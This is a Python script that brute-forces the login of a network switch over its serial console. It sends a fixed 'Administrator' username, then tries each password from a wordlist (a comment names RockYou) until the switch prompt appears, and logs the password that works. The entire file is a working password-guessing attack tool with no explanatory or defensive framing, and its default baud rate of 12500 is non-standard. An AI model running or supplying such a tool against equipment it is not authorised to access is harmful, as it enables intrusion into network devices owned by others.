import serial
import time
import argparse
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to initialize the serial connection
def init_serial_connection(port, baudrate=12500):
    try:
        ser = serial.Serial(port, baudrate, timeout=1)  # Timeout of 1 second
        logging.info(f"Connected to {port} at {baudrate} baud.")
        return ser
    except Exception as e:
        logging.error(f"Error connecting to the serial port: {e}")
        return None

# Function to send commands and read responses
def send_command(ser, command, expected_prompt, wait_time=1):
    try:
        ser.write(command.encode())  # Send the command
        time.sleep(wait_time)  # Wait for the response
        response = ser.read(ser.in_waiting).decode()  # Read the response
        logging.info(f"Response: {response}")

        if expected_prompt in response:
            logging.info("Expected prompt detected.")
            return True
        else:
            logging.warning("Expected prompt not found.")
            return False
    except Exception as e:
        logging.error(f"Error during send_command: {e}")
        return False

# Function to test passwords from a list
def test_passwords(ser, password_file):
    try:
        with open(password_file, "r", encoding="latin-1") as file:  # RockYou uses "latin-1" encoding
            for password in file:
                password = password.strip()  # Remove newline characters
                logging.info(f"Testing password: {password}")
                if login_to_switch(ser, password):
                    logging.info(f"Success! Correct password is: {password}")
                    return True
        logging.warning("No matching password found in the file.")
        return False
    except Exception as e:
        logging.error(f"Error reading password file: {e}")
        return False

# Function to login and check a single password
def login_to_switch(ser, password):
    # Hardcoded username
    username = "Administrator"

    # Send username
    logging.info(f"Sending username: {username}")
    if not send_command(ser, username + '\r', "Password:"):
        logging.error("Username not accepted or login failed.")
        return False

    # Send password
    logging.info("Sending password.")
    if send_command(ser, password + '\r', "Switch#"):
        logging.info("Password correct, login successful!")
        return True
    else:
        logging.error("Incorrect password or login failed.")
        return False

def main():
    # Use argparse for flexibility
    parser = argparse.ArgumentParser(description="Serial Connection Script for Switch Login")
    parser.add_argument("--port", required=True, help="Serial port to connect to (e.g., COM3, /dev/ttyUSB0).")
    parser.add_argument("--baudrate", type=int, default=12500, help="Baud rate for the serial connection.")
    parser.add_argument("--file", required=True, help="Path to the password list file.")
    args = parser.parse_args()

    # Initialize serial connection
    ser = init_serial_connection(args.port, args.baudrate)
    if not ser:
        return

    try:
        # Test all passwords from the file
        if test_passwords(ser, args.file):
            logging.info("Password found and login successful.")
        else:
            logging.warning("No valid password found.")
    finally:
        # Ensure the serial connection is closed
        ser.close()
        logging.info("Serial connection closed.")

if __name__ == "__main__":
    main()
